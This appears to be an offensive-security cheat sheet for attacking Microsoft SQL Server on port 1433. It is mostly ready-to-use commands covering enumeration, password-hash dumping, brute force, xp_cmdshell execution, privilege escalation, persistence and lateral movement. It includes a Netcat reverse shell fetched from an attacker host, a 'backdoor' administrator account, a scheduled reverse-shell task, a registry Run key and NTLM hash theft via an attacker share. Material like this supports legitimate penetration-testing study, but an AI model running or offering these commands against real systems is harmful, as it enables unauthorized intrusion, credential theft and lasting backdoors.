---
title: 1433 - MSSQL
draft: false
tags:
  - mssql
  - enumeration
  - credential-access
  - port-1433
NeedsReview: false
---
# Enumeration

> [!summary] Core Concept  
> Enumerate Microsoft SQL Server services to identify users, roles, permissions, databases, and execution capabilities to prepare for exploitation.

### 🔹 In — Gaining Initial Foothold → _Credential Access_

---

## 🔸 Automatic Enumeration [Nmap](Nmap.md) Scripts

```bash
nmap -sV -p1433 --script \
  ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password= \
  <target-ip>
```

|Modifier|Description|
|---|---|
|`-sV`|Detects service version information on the target port|
|`-p1433`|Scans only TCP port 1433 (default MSSQL port)|
|`--script`|Specifies NSE scripts to run during the scan|
|`ms-sql-info`|Collects general information about the SQL server instance|
|`ms-sql-empty-password`|Attempts login using empty password for known users|
|`ms-sql-xp-cmdshell`|Checks if `xp_cmdshell` can be used for command execution|
|`ms-sql-config`|Queries database configuration settings|
|`ms-sql-ntlm-info`|Retrieves NTLM authentication data if possible|
|`ms-sql-tables`|Lists all user tables in accessible databases|
|`ms-sql-hasdbaccess`|Shows which databases the user can access|
|`ms-sql-dac`|Detects support for Dedicated Administrator Connection (DAC)|
|`ms-sql-dump-hashes`|Tries to extract login names and password hashes|
|`--script-args`|Supplies custom arguments to scripts|
|`mssql.instance-port=1433`|Specifies the port where the MSSQL service is running|
|`mssql.username=sa`|Uses the `sa` user for authentication|
|`mssql.password=`|Attempts login with a blank password|

## 🔸 Metasploit Modules

```bash
use auxiliary/scanner/mssql/mssql_ping   # Identifies MSSQL instances and gathers basic information such as server name, domain, and instance name.
use auxiliary/admin/mssql/mssql_enum   # Performs enumeration of databases, configurations, roles, and privileges.
use auxiliary/admin/mssql/mssql_enum_sql_logins   # Lists SQL logins on the server, including user types and status.
use auxiliary/scanner/mssql/mssql_hashdump   # Extracts password hashes for SQL logins from the master database.
use admin/mssql/mssql_findandsampledata   # Searches for and extracts sample data from accessible tables and columns.
```

## 🔸 Manual Queries

```sql
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT @@version;
SELECT name FROM master.sys.databases;
SELECT * FROM sysobjects WHERE xtype='U';
SELECT * FROM sys.server_principals;
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

## 🔸 Bruteforce

```bash
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
```


---

# Execution

> [!summary] Core Concept  
> Achieve OS-level command execution on MSSQL using `xp_cmdshell`, PowerShell payloads, and alternative procedures.

### 🔸 Through — Navigating Internals → _Execution_

---

## 🔸 Connect with Impacket

[`Impacket`](https://github.com/fortra/impacket) is a Python toolkit that provides low-level access to network protocols, including support for Microsoft's Tabular Data Stream (TDS) used by MSSQL. The `mssqlclient.py` script allows authenticated interaction with a remote SQL Server, mimicking a SQL shell.

```bash
python3 mssqlclient.py DOMAIN/username@ip -windows-auth
```

- `DOMAIN/username@ip`: Specify the domain and user (e.g., ACME/jdoe@10.10.10.10).
- `-windows-auth`: Enables Windows Authentication (e.g., NTLM).

This is typically used _after_ credential discovery (via [13_Credential_Access](13_Credential_Access.md) or [bruteforce](1433%20-%20MSSQL.md)). Once connected, you get an interactive SQL prompt where you can run queries or stored procedures like `xp_cmdshell`.

---

## 🔸 Enable `xp_cmdshell`

By default, many MSSQL servers disable the use of `xp_cmdshell` for security reasons. This extended stored procedure allows execution of system commands (like `whoami`, `dir`, or even launching payloads) directly from SQL.

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

- `show advanced options`: Unlocks access to advanced configuration features.
- `xp_cmdshell`: Enables the ability to run operating system commands.

Enabling this is a key post-exploitation step for turning SQL access into OS-level code execution.

---

## 🔸 Upload & Trigger Reverse Shell

Once `xp_cmdshell` is enabled, you can use it to download and execute a reverse shell binary such as `nc64.exe` (Netcat).

```sql
xp_cmdshell "powershell -c wget http://your.ip/nc64.exe -outfile C:\\nc.exe"
xp_cmdshell "C:\\nc.exe your.ip 443 -e cmd.exe"
```

### Step Breakdown:

- **File download**: Uses PowerShell to download `nc64.exe` from your attack box (ensure you're hosting with `python3 -m http.server`).
    
- **Execution trigger**: Calls Netcat with `-e cmd.exe` to spawn a shell and connect back to your listener (e.g., `nc -lvnp 443`).
    

If this command works, you'll get a shell on your attacking machine with the privileges of the SQL Server service account.

---

## 🔸 Alternate Execution Paths

If `xp_cmdshell` is blocked or monitored, you can try other procedures:

|Stored Procedure|Description|
|---|---|
|`sp_OACreate`|Instantiates COM objects; can execute commands via WScript.Shell (used for RCE).|
|`sp_start_job`|Executes existing SQL Agent jobs. Jobs can be created to run OS commands if permissions allow.|
|`OPENROWSET`|Reads data from external sources, including local files, if bulk permissions are available.|
|`xp_dirtree`|Lists directories but can also trigger NTLM authentication, useful for stealing hashes via responder.|

These methods are valuable alternatives in environments where `xp_cmdshell` is restricted.

---

# Privilege Escalation

> [!summary] Core Concept  
> Escalate privileges within Microsoft SQL Server using TRUSTWORTHY databases, impersonation rights, and sysadmin role abuse.

### 🔸 Through — Navigating Internals → _Privilege Escalation_

---

## 🔸 Trustworthy Database Exploitation

```sql
USE db_name;
CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'user', 'sysadmin';
EXEC sp_elevate;
```

## 🔸 User Impersonation

```sql
SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
REVERT;
```

## 🔸 Metasploit Modules

```bash
use auxiliary/admin/mssql/mssql_escalate_execute_as
use auxiliary/admin/mssql/mssql_escalate_dbowner
```

## 🔸 PowerShell Scripts

- `Invoke-SqlServer-Escalate-ExecuteAs.psm1`
- `Invoke-SqlServer-ElevateDbOwner.psm1`

---
# Persistence

> [!summary] Core Concept  
> Maintain long-term access in SQL Server environments by creating scheduled tasks, startup procedures, registry edits, or new administrative users.

### 🔻 Out — Acting on Objectives → _Persistence_

---

## 🔸 Create User + Scheduled Task

```sql
xp_cmdshell "net user backdoor P@ss123 /add"
xp_cmdshell "net localgroup administrators backdoor /add"
xp_cmdshell "schtasks /create /sc minute /mo 5 /tn updater /tr 'cmd /c nc.exe ip 443 -e cmd.exe'"
```

## 🔸 Registry Persistence

```sql
EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'backdoor', 'REG_SZ', 'cmd.exe /c start C:\\nc.exe'
```

## 🔸 Startup Stored Procedures

- Create procedure in `master` DB
- Mark as auto-start via `sp_procoption`

## 🔸 CLR Assemblies

- Load custom .NET DLL to maintain code execution


---

# Lateral Movement

> [!summary] Core Concept  
> Pivot across systems by abusing MSSQL linked servers and triggering NTLM authentication to leak or relay credentials.

### 🔸 Through — Navigating Internals → _Lateral Movement_

---

## 🔸 Discover & Abuse Linked Servers

```sql
EXEC sp_linkedservers;
EXEC ('xp_cmdshell whoami') AT [LinkedServer];
```

## 🔸 Steal NetNTLM Hashes

```sql
EXEC xp_dirtree '\\attacker\\share'
```

```bash
sudo responder -I tun0
```

## 🔸 Tools

- Metasploit: `mssql_ntlm_stealer`, `mssql_linkcrawler`
- `mssqlpwner`: NTLM relay, link enumeration   

---
## 🔗 Related

- [NetSPI SQL Persistence Guide](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)
- [[08_Command_and_Control]] 